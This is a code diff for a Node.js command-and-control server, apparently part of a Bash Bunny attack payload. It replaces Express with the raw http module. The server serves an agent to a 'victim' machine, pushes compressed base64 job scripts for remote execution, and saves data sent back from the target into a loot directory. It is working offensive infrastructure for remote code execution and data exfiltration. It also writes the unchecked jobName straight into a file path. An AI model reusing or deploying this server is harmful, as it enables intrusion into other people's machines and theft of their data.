@@ -12,9 +12,10 @@ var prc = require('child_process');
 prc.exec('LED SPECIAL1').unref();
 var fs = require('fs');
 var zlib = require('zlib');
-var express = require('express');
-var bodyParser = require('body-parser');
-var app = express();
+var http = require('http');
+//var express = require('express');
+//var bodyParser = require('body-parser');
+//var app = express();
 var port = 1337;
 var lootdir = process.env['LOOTDIR'] || __dirname + '/tmploot';
 var jobsfolder = process.env['JOBFOLDER'] || __dirname + '/jobs/default';
@@ -27,8 +28,8 @@ var TARGET_HOSTNAME = process.env["TARGET_HOSTNAME"] || 'TestMachine';
 var BB_SMBROOT = process.env["BB_SMBROOT"] || '\\\\' + SERVERIP + '\\tmploot';
 var BB_SMBLOOT = process.env["BB_SMBLOOT"] || BB_SMBROOT + '\\' + TARGET_HOSTNAME;
 
-app.use(bodyParser.json());
-app.use(bodyParser.urlencoded({extended:false}));
+//app.use(bodyParser.json());
+//app.use(bodyParser.urlencoded({extended:false}));
 
 var FirstRun = false;
 var AgentRequested = false;
@@ -46,107 +47,176 @@ var helper = require(__dirname + '/helpers.js');
 joblist = helper.jobParser(joblist, jobsfolder);
 if(Debug){console.log(joblist);}
 
-app.get('/getAgent', function(req, res){
-    if(Debug){console.log('Agent Requested...');}
-    if(AgentRequested == false){
-        prc.exec('LED STAGE2').unref();
-        if(Debug){console.log('Agent download led indicator lit..');}
-        AgentRequested = true;
-    }
-    fs.readFile(agentfile, 'utf8', function(err, data){
-        if(err){
-            if(Debug){console.log('Error reading Agent.');}
-            exit(1);
-        }else{
-            if(Debug){console.log('Sending Agent...');}
-            res.send(data);
-        }
-    });
-});
+function writeJSONData(response, data) {
+    response.writeHead(200, {"Content-Type": "application/json"});
+    response.write(JSON.stringify(data));
+    response.end();
+}
 
-app.get('/getConfig', function(err, res){
-    var returnConfig = {}
-    returnConfig.BB_SMBLOOT = BB_SMBLOOT;
-    returnConfig.BB_SMBROOT = BB_SMBROOT;
-    returnConfig.TARGET_HOSTNAME = TARGET_HOSTNAME;
-    res.json(returnConfig);
-})
-app.get('/getJob1', function(req, res){
-    if(Debug){console.log('A job was requested');}
-    
-    sendjob = joblist.pop();
-    if(sendjob){
-        hasJobs = true;
-        if(FirstRun == false && hasJobs == true){
-            prc.exec('LED STAGE3').unref();
-            if(Debug){console.log('LED lights for first job sent..');}
-            FirstRun = true;
-        }
-        var payload = {};
-        payload.jobName = sendjob.jobName;
-        payload.command = sendjob.command;
-        payload.runType = sendjob.runType.toLowerCase();
-        fs.readFile(sendjob.scriptName, 'utf8', function(err, data){
-            if(err){
-                if(Debug){console.log("error reading payload");}
-            }else{
-                zlib.deflateRaw(new Buffer(data), function(err, buffer){
-                    payload.payload = buffer.toString('base64');
-                    //console.log(payload);
-                    res.json(payload);
-                })
+function write404Response(request, response) {
+    response.writeHead(404, {"Content-Type": "text/plain"});
+    response.write("Error: Page not found");
+    response.end();
+}
+
+function writeStringData(response, data) {
+    response.writeHead(200, {"Content-Type": "text/plain"});
+    response.write(data);
+    response.end();
+}
+
+function onGet(request, response) {
+    switch(request.url) {
+        case "/getAgent":
+            if(Debug){console.log('Agent Requested...');}
+            if(AgentRequested == false){
+                prc.exec('LED STAGE2').unref();
+                if(Debug){console.log('Agent download led indicator lit..');}
+                AgentRequested = true;
             }
-        });
-    }else{
-        if(hasJobs == true){
-            hasJobs = false;
-            FirstRun = false;
-            if(Debug){console.log('No more jobs for agent, lighting LED for empty queue.');}
-            prc.exec('CLEANUP').unref();
-        }
-        var payload = {};
-        payload.jobName = "none";
-        payload.payload = "none";
-        res.json(payload);
+            fs.readFile(agentfile, 'utf8', function(err, data){
+                if(err){
+                    if(Debug){console.log('Error reading Agent.');}
+                    write404Response(request, response);
+                    exit(1);
+                }else{
+                    if(Debug){console.log('Sending Agent...');}
+                    //res.send(data);
+                    writeStringData(response, data);
+                }
+            });
+            break;
+
+            case "/getConfig":
+                var returnConfig = {}
+                returnConfig.BB_SMBLOOT = BB_SMBLOOT;
+                returnConfig.BB_SMBROOT = BB_SMBROOT;
+                returnConfig.TARGET_HOSTNAME = TARGET_HOSTNAME;
+                writeJSONData(response, returnConfig);
+                break;
+
+            case "/getJob1":
+                if(Debug){console.log('A job was requested');}
+                
+                sendjob = joblist.pop();
+                if(sendjob){
+                    hasJobs = true;
+                    if(FirstRun == false && hasJobs == true){
+                        prc.exec('LED STAGE3').unref();
+                        if(Debug){console.log('LED lights for first job sent..');}
+                        FirstRun = true;
+                    }
+                    var payload = {};
+                    payload.jobName = sendjob.jobName;
+                    payload.command = sendjob.command;
+                    payload.runType = sendjob.runType.toLowerCase();
+                    fs.readFile(sendjob.scriptName, 'utf8', function(err, data){
+                        if(err){
+                            if(Debug){console.log("error reading payload");}
+                            response.end();
+                        }else{
+                            zlib.deflateRaw(new Buffer(data), function(err, buffer){
+                                payload.payload = buffer.toString('base64');
+                                //console.log(payload);
+                                //res.json(payload);
+                                writeJSONData(response, payload);
+                            })
+                        }
+                    });
+                }else{
+                    if(hasJobs == true){
+                        hasJobs = false;
+                        FirstRun = false;
+                        if(Debug){console.log('No more jobs for agent, lighting LED for empty queue.');}
+                        prc.exec('CLEANUP').unref();
+                    }
+                    var payload = {};
+                    payload.jobName = "none";
+                    payload.payload = "none";
+                    //res.json(payload);
+                    writeJSONData(response, payload);
+                }
+                break;
+
+            case "/quit":
+                prc.exec('LED FINISH').unref();
+                writeStringData(response, "bye");
+                process.exit(0);
+                break;
+
+            default:
+                write404Response(request, response);
+                break;
     }
-});
+}
 
-app.post('/addJob', function(req, res){
-    if(Debug){console.log(req.body);}
-    var addJobObj = req.body;
-    addJobObj = helper.jobParser(addJobObj, jobsfolder);
-    if(addJobObj){        
-        joblist.push(addJobObj);
-        res.send('done');
-    }else{
-        res.send('error');
+function onPost(request, response) {
+    switch(request.url) {
+
+        case "/addJob":
+            var preJob = "";
+            request.on('data', function(chunk) {
+                preJob += chunk;
+            });
+            request.on('end', function() {
+                if(Debug){console.log(preJob);}
+                var addJobObj = JSON.parse(preJob);
+                addJobObj = helper.jobParser(addJobObj, jobsfolder);
+                if(addJobObj){        
+                    joblist.push(addJobObj);
+                    //res.send('done');
+                    writeStringData(response, "done");
+                }else{
+                    //res.send('error');
+                    writeStringData(response, "error");
+                }
+            });            
+            break;
+
+        case "/pushData":
+            var preLog = "";
+            request.on('data', function(chunk) {
+                preLog += chunk;
+            });
+            request.on('end', function() {
+                if(Debug){console.log(preLog);}
+                var logData = JSON.parse(preLog);
+                if(logData.jobName){
+                    var logtmp = lootdir + '/' + logData.jobName + '.log';
+                    fs.writeFile(logtmp, logData.data, function(err){
+                        if(err){
+                            //res.send('error');
+                            writeStringData(response, "error");
+                        }else{
+                            //res.send('success');
+                            writeStringData(response, "success");
+                        }
+                    });
+                }else{
+                    //res.send('error');
+                    writeStringData(response, "error");
+                }
+            });            
+            break;
     }
-});
+}
 
-app.post('/pushData', function(req, res){
-    if(Debug){console.log(req.body);}
-    var logData = req.body;
-    if(logData.jobName){
-        var logtmp = lootdir + '/' + logData.jobName + '.log';
-        fs.writeFile(logtmp, logData.data, function(err){
-            if(err){
-                res.send('error');
-            }else{
-                res.send('success');
-            }
-        });
-    }else{
-        res.send('error');
+function onRequest(request, response) {
+    if(request.method == "GET") {
+        onGet(request, response);
     }
-});
+    else if(request.method == "POST") {
+        onPost(request, response);
+    } else {
+        write404Response(request, response);
+    }
+}
 
-app.get('/quit', function(req, res){
-    prc.exec('LED FINISH').unref();
-    res.send('bye');
-    process.exit(0);
-});
-
-app.listen(port, function(){
+var server = http.createServer(onRequest);
+server.listen(port, function(err) {
+    if(err) {
+        return console.log("Error starting server");
+    }
     if(Debug){
         console.log('Starting Server');
         console.log('\x1b[33m%s\x1b[0m','Copy and paste the below command to launch the agent on the victim.');
